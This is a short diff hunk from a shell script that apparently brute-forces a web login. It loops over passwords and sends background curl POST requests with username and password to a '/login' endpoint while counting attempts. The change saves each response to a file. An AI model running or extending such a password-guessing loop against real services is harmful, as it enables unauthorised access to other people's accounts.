@@ -95,7 +95,7 @@ begin(){
 
 		[[ -z "$pass" ]] && continue
 
-		curl -s -X Post "$url/login" -d "username=$user&password=$pass" &
+		curl -s -X Post "$url/login" -d "username=$user&password=$pass" 1> response.txt &
 
 		pid=$!
 		((attempts++))
